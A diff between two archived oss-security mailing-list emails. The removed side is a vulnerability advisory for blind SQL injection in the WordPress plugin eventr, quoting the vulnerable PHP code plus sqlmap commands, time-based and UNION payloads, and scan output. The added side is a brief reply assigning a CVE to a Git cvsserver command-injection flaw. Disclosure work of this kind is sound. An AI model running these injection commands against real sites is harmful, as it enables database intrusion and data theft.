@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4361" "Tuesday" "30" "May" "2017" "07:35:44" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<2B1EB846-CCB8-4220-8BA4-DF901A13364F@me.com>" "101" "[oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2" nil nil nil "5" "2017053011:35:44" "[oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2" (number mark "U       larry0@me.co May 30  101/4361  " thread-indent "\"[oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1831" "Thursday" "28" "September" "2017" "16:53:02" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20170928145302.smwgiqa4n76cjp75@eldamar.local>" "56" "Re: [oss-security] Advisory: Git cvsserver OS Command Injection" nil nil nil "9" "2017092814:53:02" "[oss-security] Advisory: Git cvsserver OS Command Injection" (number mark "U       carnil@debia Sep 28   56/1831  " thread-indent "\"Re: [oss-security] Advisory: Git cvsserver OS Command Injection\"\n") "<20170926090349.f5rwmd7be3tu2qad@refracta>" ("<20170926090349.f5rwmd7be3tu2qad@refracta>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 4040 invoked by uid 550); 30 May 2017 11:36:38 -0000
+Received: (qmail 13664 invoked by uid 550); 28 Sep 2017 14:53:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,130 +12,100 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3809 invoked from network); 30 May 2017 11:35:57 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1496144145; bh=fAVkAmnBOXzqtcLx95SlQseLZRMLiy/LnmwcyW2+sSs=;
-	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
-	b=KcJigOossy6kJAqM7z8dceNykMeqhmC/qwaN/rGBwW9uW8WyaeVOv5WpSfxZKg0nw
- a+RZfhO/LxmnCb1nhZ1DCrEbI1WjnhjttQw6mRZzUYRWkNTfgWMEKiNi+2QXU5xrMC
- Xn2JbVYtiAcNuu/3+qS0oHMUiIe0obfS7CgguLGbl/A9H54g914kmj2xAnSP/erPgN
- qAukgjEJ70k3jjoI68nD3v7q1oZ3sSsyUDq3A/CUKbGskm688guuKpnc38+mdPmBCW
- oxi3prBuNZU2aLdV0CPP/j2sbq7yk6PHWovx/vlzMnrWzwq2YoiseDd1B6Ew1FTVy1
- zuLwBUFXCw/eQ==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2017-05-30_08:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1701120000 definitions=main-1705300222
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <2B1EB846-CCB8-4220-8BA4-DF901A13364F@me.com>
-Date: Tue, 30 May 2017 07:35:44 -0400
-To: Open Source Security <oss-security@lists.openwall.com>
-MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-X-Mailer: Apple Mail (2.3124)
-Subject: [oss-security] Blind SQL Injection in Wordpress plugin eventr v1.02.2
+Received: (qmail 13640 invoked from network); 28 Sep 2017 14:53:19 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=sender:date:from:to:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to:user-agent;
+        bh=50RirKK9ry5i8Py0fUABKJOhu9yJvqWWhndrkrTomNk=;
+        b=Gm8pS+TusUJcbGaSEMwbl0xwBbeVXgyHogTCjLxt81YMJsIiKtk2wV7nAm/Yon0kjN
+         ZpxBuhlmtXkX5tlZyqv6LXAw0GwrXhUB63Q563PkKLoknIu1I8hGvuQkH2B3OdFDrsfE
+         rGh+vKiUSbptVVkb8R5te3z71vCJERIFauqQ/Pck1QXeOlzBMSRdx5UJOKzbvOPXROF1
+         JPZLPcaZrpGTQ5b2VC/p8CqgVbmoGt8OekYcwQc9aRY8JaNKnrjCfv/c39aAHNMGY42g
+         IWEc1P1iQhXXDuPDKSXX1+5LMekIRfetCl9t80u6nk/2ZEG9Wf5zbHf1KquX1FqAS0/Q
+         IdpQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:sender:date:from:to:subject:message-id
+         :references:mime-version:content-disposition:in-reply-to:user-agent;
+        bh=50RirKK9ry5i8Py0fUABKJOhu9yJvqWWhndrkrTomNk=;
+        b=lFUYeWnFNicTNZ4pTX606qTL2kLuTc2MF/Vi4avFT8d54EwpLqhrixnIjuQRMwR4lW
+         DW8CUutB813EB1lLLdAiR64UPYksmJ4fxesO4gS3PtvkbTddocEn39yusNPGA3c1Egzi
+         ASKFPHv77mQ5JQXmJOueOKjDzokCI5OE3FYRSX1+Pu46/RNXG0PaDNm1MjvtAcmhFW8q
+         +VlVRP4ts4yqWQKfZJ/+/vG+euO+tFIeGsRacaySVe8jsGHNZuqbYZBdnjDr6losQG0v
+         yQ+Y7kpXtIaQqhm9vbbM7h+6iPNqP4PcR5robAJqqu/U4U0zIXm0UmssTYPPY6PcTAq0
+         i0WQ==
+X-Gm-Message-State: AHPjjUjQlmzeL+xEMUuEDyRLh6aBdkmk1lio1Um1R/J2BFWTNbqvigCc
+	N/7qqNr01zqC/zsmCRZt6uXM2w==
+X-Google-Smtp-Source: AOwi7QD2yyZ1cHC/mz2eSGf/OtZ+caOvnXHv7WKo59CUGNpwDBfTa4dhDDbScimdJAIez1/5pGSwSg==
+X-Received: by 10.223.157.3 with SMTP id k3mr5485284wre.122.1506610387831;
+        Thu, 28 Sep 2017 07:53:07 -0700 (PDT)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Thu, 28 Sep 2017 16:53:02 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
+To: oss-security@lists.openwall.com
+Message-ID: <20170928145302.smwgiqa4n76cjp75@eldamar.local>
+References: <20170926090349.f5rwmd7be3tu2qad@refracta>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <20170926090349.f5rwmd7be3tu2qad@refracta>
+User-Agent: NeoMutt/20170609 (1.8.3)
+Subject: Re: [oss-security] Advisory: Git cvsserver OS Command Injection
 
-Title: Blind SQL Injection in Wordpress plugin eventr v1.02.2
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-05-21
-CVE-ID:[CVE-2017-1002018][CVE-2017-1002019]
-Download Site: https://wordpress.org/plugins/eventr/
-Vendor: http://www.binnyva.com/
-Vendor Notified: 2017-05-22
-Vendor Contact: plugins@wordpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D192
-Description: Use this plugin if you want to use your blog an event manageme=
-nt tool.
-Vulnerability:
-The edit form and attendees.php code do not sanitize input to $_REQUSET[eve=
-nt] this allows blind time-based SQL injection by an authenticated user who=
- is able to modify events.
+Hi
 
-CVE-2017-1002018
-In attendees.php:
+On Tue, Sep 26, 2017 at 11:03:49AM +0200, joernchen wrote:
+> Hi,
+> 
+> 
+> see attached advisory.
+> 
+> Cheers,
+> 
+> joernchen
+> -- 
+> joernchen ~ Phenoelit
+> <joernchen@phenoelit.de> ~ C776 3F67 7B95 03BF 5344
+> http://www.phenoelit.de  ~ A46A 7199 8B7B 756A F5AC
 
-40 $search =3D '';
- 41 if(isset($_REQUEST['search']) and $_REQUEST['search']) $search =3D "AND=
- A.name LIKE '%$_REQUEST[search]%'";
- 42=20
- 43 $all_attendee =3D $wpdb->get_results("SELECT A.ID,A.name,A.url,A.email,=
- EA.added_on, A.status FROM `{$wpdb->prefix}eventr_attendee` AS A
- 44                                                                        =
-         INNER JOIN `{$wpdb->prefix}eventr_event_attendee` AS EA ON attende=
-e_ID=3DA.ID
- 45                                                                        =
-         WHERE EA.event_ID=3D$_REQUEST[event] $search ORDER BY A.name LIMIT=
- $offset, $items    _per_page");
+> Phenoelit Advisory <wir-haben-auch-mal-was-gefunden #0815 ++--->
+> 
+> [ Authors ]
+>         joernchen       <joernchen () phenoelit de>
+> 
+>         Phenoelit Group (http://www.phenoelit.de)
+> 
+> [ Affected Products ]
+>         Git before 2.14.2, 2.13.6, 2.12.5, 2.11.4 and 2.10.5 (git-cvsserver)
+>         https://git-scm.com
+> 
+> [ Vendor communication ]
+>         2017-09-08 Sent vulnerability details to the git-security list
+>         2017-09-09 Acknowledgement of the issue, git maintainers ask if
+>                    a patch could be provided
+>         2017-09-10 Patch is provided
+>         2017-09-11 Further backtick operations are patched by the git
+>                    maintainers, corrections on the provided patch
+>         2017-09-11 Revised patch is sent out
+>         2017-09-11 Jeff King proposes to drop `git-cvsserver`'s default
+>                    invocation from `git-shell`
+>         2017-09-22 Draft release for git 2.14.2 is created including the
+>                    fixes
+>         2017-09-26 Release of this advisory, release of fixed git versions
+> 
+> [ Description ]
+> 	The `git` subcommand `cvsserver` is a Perl script which makes excessive
+> 	use of the backtick operator to invoke `git`. Unfortunately user input
+>         is used within some of those invocations.
+> 
+> 
+> 	It should be noted, that `git-cvsserver` will be invoked by `git-shell`
+>         by default without further configuration.
 
-CVE-2017-1002019
+FTR, this has been assigned CVE-2017-14867.
 
-In event_form.php:
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14867
 
-  5 $action =3D 'new';
-  6 if($_REQUEST['action'] =3D=3D 'edit') $action =3D 'edit';
-  7=20
-  8 $event =3D array();
-  9 if($action =3D=3D 'edit') {
- 10         $event =3D $wpdb->get_row("SELECT name,description,event_date,m=
-aximum_attendees,landing_page,status FROM {$wpdb->prefix}eventr_event WHERE=
- ID =3D $_REQUEST[event]");
- 11 }
-
-Exploit Code:
-	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=
-=3Deventr%2Fattendees.php&event=3D*' --dbms mysql  --level 3 --risk 3 --loa=
-d-cookies=3D./cookies.txt
-	=E2=80=A2=20=20
-	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
-he others (if any)? [y/N]=20
-	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
-of 1250 HTTP(s) requests:
-	=E2=80=A2 ---
-	=E2=80=A2 Parameter: #1* (URI)
-	=E2=80=A2     Type: AND/OR time-based blind
-	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
-e (substraction)
-	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
-age=3Deventr/attendees.php&event=3D(SELECT * FROM (SELECT(SLEEP(5)))qppS)
-	=E2=80=A2=20=20
-	=E2=80=A2     Type: UNION query
-	=E2=80=A2     Title: Generic UNION query (random number) - 6 columns
-	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
-age=3Deventr/attendees.php&event=3D-2450 UNION ALL SELECT CONCAT(0x716a7a6a=
-71,0x566d4a744c4353656f664d75435376426a736e4d7056476e4d536a465169736e654b42=
-52777a7161,0x716a766271),9012,9012,9012,9012,9012-- pgAi
-	=E2=80=A2 ---
-	=E2=80=A2 [20:38:00] [INFO] the back-end DBMS is MySQL
-	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
-	=E2=80=A2 web application technology: Apache 2.4.18
-	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
-	=E2=80=A2 [20:38:00] [INFO] fetched data logged to text files under '/home=
-/larry/.sqlmap/output/example.com'
-	=E2=80=A2=20=20
-	=E2=80=A2 [*] shutting down at 20:38:00
-	=E2=80=A2=20=20
-	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=
-=3Deventr%2Fevent_form.php&event=3D*&action=3Dedit' --dbms mysql  --level 3=
- --risk 3 --load-cookies=3D./cookies.txt
-	=E2=80=A2=20=20
-	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
-of 1476 HTTP(s) requests:
-	=E2=80=A2 ---
-	=E2=80=A2 Parameter: #1* (URI)
-	=E2=80=A2     Type: AND/OR time-based blind
-	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
-	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/edit.php?p=
-age=3Deventr/event_form.php&event=3D(CASE WHEN (9111=3D9111) THEN SLEEP(5) =
-ELSE 9111 END)&action=3Dedit
-	=E2=80=A2 ---
-	=E2=80=A2 [06:58:46] [INFO] the back-end DBMS is MySQL
-	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
-	=E2=80=A2 web application technology: Apache 2.4.18
-	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
-	=E2=80=A2 [06:58:46] [INFO] fetched data logged to text files under '/home=
-/larry/.sqlmap/output/example.com'
-	=E2=80=A2=20=20
-	=E2=80=A2 [*] shutting down at 06:58:46=
+Regards,
+Salvatore
